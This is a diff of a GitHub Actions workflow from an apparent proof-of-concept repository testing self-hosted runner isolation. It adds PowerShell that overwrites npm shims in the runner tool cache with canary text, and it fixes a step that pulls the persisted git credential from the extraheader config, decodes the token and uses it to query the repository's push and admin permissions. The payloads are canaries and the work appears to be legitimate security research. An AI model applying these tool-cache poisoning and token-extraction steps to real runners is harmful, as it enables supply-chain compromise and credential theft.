@@ -19,10 +19,15 @@ jobs:
         run: |
           $nodeRoot = Join-Path $env:RUNNER_TOOL_CACHE 'node'
           $shims = @(Get-ChildItem -Path $nodeRoot -Recurse -Filter 'npm.cmd' -ErrorAction SilentlyContinue)
-          if ($shims.Count -eq 0) { Write-Host 'E1_SETUP_FAIL: no npm.cmd found in tool cache'; exit 1 }
+          $ps1 = @(Get-ChildItem -Path $nodeRoot -Recurse -Filter 'npm.ps1' -ErrorAction SilentlyContinue)
+          if (($shims.Count + $ps1.Count) -eq 0) { Write-Host 'E1_SETUP_FAIL: no npm shims found in tool cache'; exit 1 }
           foreach ($s in $shims) {
             Set-Content -Path $s.FullName -Value '@echo E1_NPM_CANARY poisoned_toolcache_shim' -Encoding ascii
             Write-Host "E1_POISONED=$($s.FullName)"
+          }
+          foreach ($s in $ps1) {
+            Set-Content -Path $s.FullName -Value "Write-Output 'E1_NPM_CANARY poisoned_toolcache_shim'" -Encoding utf8
+            Write-Host "E1_POISONED_PS1=$($s.FullName)"
           }
           Set-Content -Path (Join-Path $nodeRoot 'E1_POISONED.marker') -Value 'poisoned-by-e1-poison-job'
 
@@ -45,7 +50,7 @@ jobs:
           $eh = git config --local --get 'http.https://github.com/.extraheader'
           if (-not $eh) { Write-Host 'E6: no persisted credential in git config'; exit 0 }
           $b64 = ($eh -split 'basic ')[1].Trim()
-          $plain = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64($b64))
+          $plain = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
           $tok = ($plain -split ':', 2)[1]
           $r = Invoke-RestMethod -Uri 'https://api.github.com/repos/madhanalagarsamy/selfhosted-runner-poc' -Headers @{ Authorization = "Bearer $tok"; 'User-Agent' = 'poc' }
           Write-Host "E6_TOKEN_FROM_GITCONFIG=ok perms.push=$($r.permissions.push) perms.admin=$($r.permissions.admin)"
